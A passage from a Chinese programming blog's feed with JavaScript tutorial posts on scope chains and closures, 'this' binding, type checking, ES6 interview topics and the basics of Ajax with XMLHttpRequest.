class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;<br>   var scope = <span class="hljs-string">"global"</span>; <br>   <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">fn1</span></span>()&#123;<br>      <span class="hljs-built_in">return</span> scope; <br>   &#125;<br>   <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">fn2</span></span>()&#123;<br>      <span class="hljs-built_in">return</span> scope;<br>   &#125;<br>   fn1();<br>   fn2();<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure></p><p>上面代码执行情况演示： </p><p><img src="https://img-blog.csdn.net/20170429211440774" alt></p><p>了解了环境变量，再详细讲讲作用域链。<br>当某个函数第一次被调用时，就会创建一个执行环境(execution context)以及相应的作用域链，并把作用域链赋值给一个特殊的内部属性([scope])。然后使用this，arguments(arguments在全局环境中不存在)和其他命名参数的值来初始化函数的活动对象(activation object)。当前执行环境的变量对象始终在作用域链的第0位。<br>以上面的代码为例，当第一次调用fn1()时的作用域链如下图所示：<br>（因为fn2()还没有被调用，所以没有fn2的执行环境） </p><p><img src="https://img-blog.csdn.net/20170430104545087" alt></p><p>可以看到fn1活动对象里并没有scope变量，于是沿着作用域链(scope chain)向后寻找，结果在全局变量对象里找到了scope，所以就返回全局变量对象里的scope值。</p><blockquote><p>标识符解析是沿着作用域链一级一级地搜索标识符地过程。搜索过程始终从作用域链地前端开始，然后逐级向后回溯，直到找到标识符为止（如果找不到标识符，通常会导致错误发生）—-《JavaScript高级程序设计》</p></blockquote><p>那作用域链地作用仅仅只是为了搜索标识符吗？<br>再来看一段代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;<br>   <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">outer</span></span>()&#123;<br>      var scope = <span class="hljs-string">"outer"</span>;<br>      <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">inner</span></span>()&#123;<br>         <span class="hljs-built_in">return</span> scope;<br>      &#125;<br>      <span class="hljs-built_in">return</span> inner;<br>   &#125;<br>   var fn = outer();<br>   fn();<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>outer()内部返回了一个inner函数，当调用outer时，inner函数的作用域链就已经被初始化了（复制父函数的作用域链，再在前端插入自己的活动对象），具体如下图：<br><img src="https://img-blog.csdn.net/20170430112410039" alt></p><p>一般来说，当某个环境中的所有代码执行完毕后，该环境被销毁（弹出环境栈），保存在其中的所有变量和函数也随之销毁（全局执行环境变量直到应用程序退出，如网页关闭才会被销毁）<br>但是像上面那种有内部函数的又有所不同，当outer()函数执行结束，执行环境被销毁，但是其关联的活动对象并没有随之销毁，而是一直存在于内存中，因为该活动对象被其内部函数的作用域链所引用。<br>具体如下图：<br>outer执行结束，内部函数开始被调用<br>outer执行环境等待被回收，outer的作用域链对全局变量对象和outer的活动对象引用都断了</p><p><img src="https://img-blog.csdn.net/20170430115351877" alt></p><p>像上面这种内部函数的作用域链仍然保持着对父函数活动对象的引用，就是闭包(closure)</p><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>闭包有两个作用：<br>第一个就是可以读取自身函数外部的变量（沿着作用域链寻找）<br>第二个就是让这些外部变量始终保存在内存中<br>关于第二点，来看一下以下的代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;<br>   <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">outer</span></span>()&#123;<br>      var result = new Array();<br>      <span class="hljs-keyword">for</span>(var i = 0; i &lt; 2; i++)&#123;//注：i是outer()的局部变量<br>         result[i] = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>            <span class="hljs-built_in">return</span> i;<br>         &#125;<br>      &#125;<br>      <span class="hljs-built_in">return</span> result;//返回一个函数对象数组<br>      //这个时候会初始化result.length个关于内部函数的作用域链<br>   &#125;<br>   var fn = outer();<br>   console.log(fn[0]());//result：2<br>   console.log(fn[1]());//result：2<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure></p><p>返回结果很出乎意料吧，你肯定以为依次返回0，1，但事实并非如此<br>来看一下调用fn<a href>0</a>的作用域链图： </p><p><img src="https://img-blog.csdn.net/20170430122035791" alt></p><p>可以看到result[0]函数的活动对象里并没有定义i这个变量，于是沿着作用域链去找i变量，结果在父函数outer的活动对象里找到变量i(值为2)，而这个变量i是父函数执行结束后将最终值保存在内存里的结果。<br>由此也可以得出，js函数内的变量值不是在编译的时候就确定的，而是等在运行时期再去寻找的。</p><p>那怎么才能让result数组函数返回我们所期望的值呢？<br>看一下result的活动对象里有一个arguments，arguments对象是一个参数的集合，是用来保存对象的。<br>那么我们就可以把i当成参数传进去，这样一调用函数生成的活动对象内的arguments就有当前i的副本。<br>改进之后：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;<br>   <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">outer</span></span>()&#123;<br>      var result = new Array();<br>      <span class="hljs-keyword">for</span>(var i = 0; i &lt; 2; i++)&#123;<br>         //定义一个带参函数<br>         <span class="hljs-keyword">function</span> arg(num)&#123;<br>            <span class="hljs-built_in">return</span> num;<br>         &#125;<br>         //把i当成参数传进去<br>         result[i] = arg(i);<br>      &#125;<br>      <span class="hljs-built_in">return</span> result;<br>   &#125;<br>   var fn = outer();<br>   console.log(fn[0]);//result:0<br>   console.log(fn[1]);//result:1<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>虽然的到了期望的结果，但是又有人问这算闭包吗？调用内部函数的时候，父函数的环境变量还没被销毁呢，而且result返回的是一个整型数组，而不是一个函数数组！<br>确实如此，那就让arg(num)函数内部再定义一个内部函数就好了：<br>这样result返回的其实是innerarg()函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;<br>   <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">outer</span></span>()&#123;<br>      var result = new Array();<br>      <span class="hljs-keyword">for</span>(var i = 0; i &lt; 2; i++)&#123;<br>         //定义一个带参函数<br>         <span class="hljs-keyword">function</span> arg(num)&#123;<br>            <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">innerarg</span></span>()&#123;<br>               <span class="hljs-built_in">return</span> num;<br>            &#125;<br>            <span class="hljs-built_in">return</span> innerarg;<br>         &#125;<br>         //把i当成参数传进去<br>         result[i] = arg(i);<br>      &#125;<br>      <span class="hljs-built_in">return</span> result;<br>   &#125;<br>   var fn = outer();<br>   console.log(fn[0]());<br>   console.log(fn[1]());<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>当调用outer，for循环内i=0时的作用域链图如下：<br><img src="https://img-blog.csdn.net/20170430160650039" alt></p><p>由上图可知，当调用innerarg()时，它会沿作用域链找到父函数arg()活动对象里的arguments参数num=0.<br>上面代码中，函数arg在outer函数内预先被调用执行了，对于这种方法，js有一种简洁的写法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">outer</span></span>()&#123;<br>     var result = new Array();<br>     <span class="hljs-keyword">for</span>(var i = 0; i &lt; 2; i++)&#123;<br>        //定义一个带参函数<br>        result[i] = <span class="hljs-keyword">function</span>(num)&#123;<br>           <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">innerarg</span></span>()&#123;<br>              <span class="hljs-built_in">return</span> num;<br>           &#125;<br>           <span class="hljs-built_in">return</span> innerarg;<br>        &#125;(i);//预先执行函数写法<br>        //把i当成参数传进去<br>     &#125;<br>     <span class="hljs-built_in">return</span> result;<br>  &#125;<br></code></pre></td></tr></table></figure><h2 id="关于this对象"><a href="#关于this对象" class="headerlink" title="关于this对象"></a>关于this对象</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">　　var name = <span class="hljs-string">"The Window"</span>;<br>　　var object = &#123;<br>　　　　name : <span class="hljs-string">"My Object"</span>,<br>　　　　getNameFunc : <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>　　　　　　<span class="hljs-built_in">return</span> <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>　　　　　　　　<span class="hljs-built_in">return</span> this.name;<br>　　　　　　&#125;;<br>　　　　&#125;<br>　　&#125;;<br>　　alert(object.getNameFunc()());//result:The Window<br></code></pre></td></tr></table></figure><p>《javascript高级程序设计》一书给出的解释是：</p><blockquote><p>this对象是在运行时基于函数的执行环境绑定的：在全局函数中，this等于window，而当函数被作为某个对象调用时，this等于那个对象。不过，匿名函数具有全局性，因此this对象同常指向window</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>this,类型检测,es6</title>
      <link href="/2018/08/02/this-%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B-es6/"/>
      <url>/2018/08/02/this-%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B-es6/</url>
      
        <content type="html"><![CDATA[<h2 id="this相关"><a href="#this相关" class="headerlink" title="this相关"></a>this相关</h2><p> 关于this的详细介绍可以查看 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/this" target="_blank" rel="noopener">MDN this</a> 。在谈如何改变函数中this的指向时，我们先来谈一下this指向的究竟是什么。在传统的面向对象语言中，this指向的就是对象本身，那么JS是不是也一样呢？首先我们先执行下面的代码<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"> <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">getThis</span></span>() &#123;<br>    console.log(this)<br>&#125;<br>getThis(); //Window<br><br>var ObjectB = &#123;<br>    getThis: getThis<br>&#125;<br>ObjectB.getThis() //Object<br><br>var getThisA = ObjectB.getThis<br>getThisA() //Object<br></code></pre></td></tr></table></figure></p><p> 输出结果<br> <img src="https://img-blog.csdn.net/20170917212002240?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMTcwMDQzMjc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt></p><p> 如果this指向的是对象本身的话，那么三个输出应该是一样的，而在这里我们可以看到三个输出并不是完全相同。其实在JS中this指向的是执行上下文，什么是执行上下文呢，通俗来说也就是执行这个函数的对象。像第一次执行执行的对象是全局Window，而第二次执行是ObjectB，第三次执行也是全局Window。根据这个原理，我们只要改变执行函数的对象就能改变this的指向。执行函数的方式有以下方式：</p><ul><li>直接调用</li><li>作为对象的方法调用</li><li>call和apply方法</li><li>bind方法</li><li>还有一个不太确定的就是箭头函数</li></ul><p>直接调用和作为对象方法调用改变this指向在上个例子已经展示出来了，接下来着重介绍call、apply和bind方法，为何方便辨识对象下面定义类都使用构造函数的方法定义。<br>测试代码如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">var getThis = <span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;<br>    console.log(this)<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">ObjectA</span></span>() &#123;&#125;<br>objectA = new ObjectA()<br><br>// 直接执行时getThis的this指向<br>console.log(<span class="hljs-string">"直接执行时getThis的this指向"</span>)<br>getThis()<br><br>// call方法改变getThis中this的指向<br>console.log(<span class="hljs-string">"call方法改变getThis中this的指向"</span>)<br>getThis.call(objectA)<br><br>// apply方法改变getThis中this的指向<br>console.log(<span class="hljs-string">"apply方法改变getThis中this的指向"</span>)<br>getThis.apply(objectA)<br><br>// <span class="hljs-built_in">bind</span>方法改变getThis中this的指向<br>console.log(<span class="hljs-string">"bind方法改变getThis中this的指向"</span>)<br>var newGetThis = getThis.bind(objectA)<br>newGetThis()<br></code></pre></td></tr></table></figure><p>执行结果如下<br><img src="https://img-blog.csdn.net/20170918003524280?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMTcwMDQzMjc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt></p><p>可以看出通过call，apply和bind方法可以轻松改变函数中this的指向。</p><p>还有就是箭头函数，相对与普通函数来说，箭头函数this的指向一定是声明他的对象，那么相对与普通函数来说，应该改变的却没有改变，那究竟算不算改变了指向呢？如果是面试的话可以跟面试官讨论一下，就从我的面试来说，面试官是不同一箭头函数改变this指向这种说法的。箭头函数跟普通函数this指向的测试如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">var ObjectA = <span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;<br>    this.getThis = () =&gt; &#123;<br>        console.log(this)<br>    &#125;<br>    this.otherGetThis = <span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;<br>        console.log(this)<br>    &#125;<br>&#125;<br>var objectA = new ObjectA()<br>var getThis = objectA.getThis<br>console.log(<span class="hljs-string">"箭头函数this指向"</span>)<br>getThis()<br>var otherGetThis = objectA.otherGetThis<br>console.log(<span class="hljs-string">"普通函数this指向"</span>)<br>otherGetThis()<br></code></pre></td></tr></table></figure><p>运行结果如下</p><p><img src="https://img-blog.csdn.net/20170918011444555?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMTcwMDQzMjc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt></p><p>可以看到箭头函数的指向是没有改变的还是指向ObjectA而普通函数this指向了调用它的全局Window</p><hr><h2 id="类型检测"><a href="#类型检测" class="headerlink" title="类型检测"></a>类型检测</h2><p> 在面试过程中，面试官有问到关于JS类型检测的问题，之前也没有考虑过这个问题，就答了一个 instanceof 运算符，然后面试官接着就问除了 instanceof 呢或者是 instanceof 有什么缺陷。当时就没想起来，其实在JS中有 instanceof 和 typeof 两个关于类型检测的运算符，在《JavaScript高级程序设计》中有这种说法：当检测的是基础类型的时候使用 typeof 更好，而当检测的是引用类型的时候使用 instanceof 更好。为什么会有这种说法呢，我们可以看一下测试代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">var ObjectA = <span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;&#125;<br>var objectA = new ObjectA()<br>console.log(<span class="hljs-string">"获取objectA的类型"</span>)<br>console.log(typeof objectA)<br>console.log(<span class="hljs-string">"判断objectA是否为Object的引用"</span>)<br>console.log(objectA instanceof Object)<br>console.log(<span class="hljs-string">"判断objectA是否为ObjectA的引用"</span>)<br>console.log(objectA instanceof ObjectA)<br><br>var num = 1<br>console.log(<span class="hljs-string">"判断num的类型"</span>)<br>console.log(typeof num)<br>console.log(<span class="hljs-string">"判断num是否为Number的引用"</span>)<br>console.log(num instanceof Number)<br><br>num = new Number(1)<br>console.log(<span class="hljs-string">"判断重新赋值的num的类型"</span>)<br>console.log(typeof num)<br>console.log(<span class="hljs-string">"判断重新赋值的num是否为Number的引用"</span>)<br>console.log(num instanceof Number)<br></code></pre></td></tr></table></figure><p>输出的结果如图所示<br><img src="https://img-blog.csdn.net/20170918113623525?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMTcwMDQzMjc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt></p><p>我们可以看到使用 typeof 运算精度只能是基础类型也就是 number ， string ， undefined ， boolean ， object ，要注意的是 null 和数组使用 typeof 运算符得到的也是 object 而 instanceof 运算符可以精确到是哪一种类型的引用例如测试程序中的ObjectA，但 instanceof 也有一个缺陷就是对于直接赋值的数字，字符串，布尔值以及数组是不能将其识别为Number，String，Boolean，Array。这时候怎么将两者的优势结合起来让直接赋值的数字，字符串，布尔值和数组能直接获取到正确的类型呢？我主要是从loadash的源码中获取灵感的，我们可以使用Symbol.toStringTag的方法获取各种类型的tag，其中Number类型的tag为[object,Number]，以此类推。而自定义的属性可一通过重写get[Symbol.toStringTag]来自定义tag，测试的代码入下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">class ObjectA &#123;<br>    get [Symbol.toStringTag]() &#123;<br>      <span class="hljs-built_in">return</span> <span class="hljs-string">"ObjectA"</span>;<br>    &#125;<br>&#125;<br>var objectA = new ObjectA()<br>console.log(<span class="hljs-string">"获取自定义类型的类型"</span>)<br>console.log(Object.prototype.toString.call(objectA))<br>var num = 1<br>console.log(<span class="hljs-string">"获取普通类型的对应的类型"</span>)<br>console.log(Object.prototype.toString.call(num))<br>num = new Number(1)<br>console.log(<span class="hljs-string">"获取引用类型的类型"</span>)<br>console.log(Object.prototype.toString.call(num))<br></code></pre></td></tr></table></figure></p><p>运行结果如下图所示<br><img src="https://img-blog.csdn.net/20170918145149725?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMTcwMDQzMjc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt></p><p>通过这种方法无论是直接赋值还是构造函数赋值，无论是内置类型还是自定义类型都能够识别，相对来说是比较通用的解决办法。</p><hr><h2 id="es6"><a href="#es6" class="headerlink" title="es6"></a>es6</h2><p> 我觉得现在前端的面试是肯定会问到的，所以在面试前特意复习了一下，然而到了面试的时候面试官问的关于es6的东西几乎都没有答上。面试官主要问了两个问题，es6新增了哪些数据类型；你使用过es6哪些新特性。<br>es6仅仅新增了一个数据类型那就是Symbol，关于Symbol的详细介绍可以参考 阮一峰的es6入门教程 。<br>至于es6的新特性那就多了，在这里列出常用的几种:<br><strong>数据解构，class，promise，构造器，Proxy，Reflect，箭头函数</strong>。 </p>]]></content>
      
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ajax实现原理</title>
      <link href="/2018/07/31/ajax%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/"/>
      <url>/2018/07/31/ajax%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是Ajax"><a href="#什么是Ajax" class="headerlink" title="什么是Ajax"></a>什么是Ajax</h2><p>AJAX 的全称是Asynchronous JavaScript and XML，其中，Asynchronous是异步的意思，它有别于传统web开发中采用的同步的方式。<br>AJAX 不是新的编程语言，而是一种使用现有标准的新方法。 AJAX是与服务器交换数据并更新部分网页的艺术，在不重新加载整个页面的情况下。</p><h2 id="Ajax所包含的技术"><a href="#Ajax所包含的技术" class="headerlink" title="Ajax所包含的技术"></a>Ajax所包含的技术</h2><ol><li>使用CSS和XHTML来表示。 </li><li>使用DOM模型来交互和动态显示。 </li><li>使用XMLHttpRequest来和服务器进行异步通信。 </li><li>使用javascript来绑定和调用。<br>在上面几中技术中，除了XmlHttpRequest对象以外，其它所有的技术都是基于web标准并且已经得到了广泛使用的，XMLHttpRequest虽然目前还没有被W3C所采纳，但是它已经是一个事实的标准，因为目前几乎所有的主流浏览器都支持它。</li></ol><h2 id="Ajax实现原理"><a href="#Ajax实现原理" class="headerlink" title="Ajax实现原理"></a>Ajax实现原理</h2><p>在上面提到了XMLHTTPRequest，这个XMLHTTPRequest是什么呢？</p><p>从重要性来说，XMLHttpRequest 是 AJAX 的基础。所有现代浏览器（IE7+、Firefox、Chrome、Safari 以及 Opera）均内建 XMLHttpRequest 对象。</p><h3 id="创建XmlHttpRequest的语法"><a href="#创建XmlHttpRequest的语法" class="headerlink" title="创建XmlHttpRequest的语法"></a>创建XmlHttpRequest的语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">CreateXmlHttp</span></span>() &#123;<br><br>    //非IE浏览器创建XmlHttpRequest对象<br>    <span class="hljs-keyword">if</span> (window.XmlHttpRequest) &#123;<br>        xmlhttp = new XmlHttpRequest();<br>    &#125;<br><br>    //IE浏览器创建XmlHttpRequest对象<br>    <span class="hljs-keyword">if</span> (window.ActiveXObject) &#123;<br>        try &#123;<br>            xmlhttp = new ActiveXObject(<span class="hljs-string">"Microsoft.XMLHTTP"</span>);<br>        &#125;<br>        catch (e) &#123;<br>            try &#123;<br>                xmlhttp = new ActiveXObject(<span class="hljs-string">"msxml2.XMLHTTP"</span>);<br>            &#125;<br>            catch (ex) &#123; &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="XMLHTTPRequest这个对象的属性。"><a href="#XMLHTTPRequest这个对象的属性。" class="headerlink" title="XMLHTTPRequest这个对象的属性。"></a>XMLHTTPRequest这个对象的属性。</h3><p>onreadystatechange 每次状态改变所触发事件的事件处理程序。<br>responseText 从服务器进程返回数据的字符串形式。<br>responseXML 从服务器进程返回的DOM兼容的文档数据对象。<br>status 从服务器返回的数字代码，比如常见的404（未找到）和200（已就绪）<br>status Text 伴随状态码的字符串信息<br>readyState 对象状态值<br>　0 (未初始化) 对象已建立，但是尚未初始化（尚未调用open方法）<br>　1 (初始化) 对象已建立，尚未调用send方法<br>　2 (发送数据) send方法已调用，但是当前的状态及http头未知<br>  3 (数据传送中) 已接收部分数据，因为响应及http头不全，这时通过responseBody和responseText获取部分数据会出现错误，<br>　4 (完成) 数据接收完毕,此时可以通过通过responseXml和responseText获取完整的回应数据</p><h3 id="XMLHTTPRequest的方法"><a href="#XMLHTTPRequest的方法" class="headerlink" title="XMLHTTPRequest的方法"></a>XMLHTTPRequest的方法</h3><p>open(method,url,async)，规定请求的类型、URL 以及是否异步处理请求。<br>1.method：请求的类型；GET 或 POST<br>2.url：文件在服务器上的位置<br>3.async：true（异步）或 false（同步）<br>send(string)，将请求发送到服务器。<br>string：仅用于 POST 请求<br>setRequestHeader(header,value)<br>向请求添加 HTTP 头。<br>header: 规定头的名称<br>value: 规定头的值<br>abort 方法<br>如果XMLHttpRequest对象的 readyState 属性还没有变成4，这个方法可以终止请求。这个方法可以确保异步请求中的回调不被执行。<br>GET 还是 POST？<br>与 POST 相比，GET 更简单也更快，并且在大部分情况下都能用。<br>然而，在以下情况中，请使用 POST 请求：<br>1、无法使用缓存文件（更新服务器上的文件或数据库）<br>2、向服务器发送大量数据（POST 没有数据量限制）<br>3、发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠</p><h3 id="异步-True-or-False"><a href="#异步-True-or-False" class="headerlink" title="异步-True or False?"></a>异步-True or False?</h3><p>当使用 async=true 时，需要利用XMLHTTPRequest的 onreadystatechange 事件来执行相应状态时的函数，下面是一个例子<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">xmlhttp.onreadystatechange=<span class="hljs-function"><span class="hljs-title">function</span></span>()<br>  &#123;<br>  <span class="hljs-keyword">if</span> (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)<br>    &#123;<br>      alert(xmlhttp.responseText);<br>    &#125;<br>  &#125;<br>xmlhttp.open(<span class="hljs-string">"GET"</span>,<span class="hljs-string">"url"</span>,<span class="hljs-literal">true</span>);<br>xmlhttp.send();<br></code></pre></td></tr></table></figure></p><p>而当async=false时，则不需要，下面是为false时的用法<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">xmlhttp.open(<span class="hljs-string">"GET"</span>,<span class="hljs-string">"url"</span>,<span class="hljs-literal">false</span>);<br>xmlhttp.send();<br>alert(xmlhttp.responseText);<br></code></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端性能优化</title>
      <link href="/2018/07/31/%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
      <url>/2018/07/31/%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/</url>
      
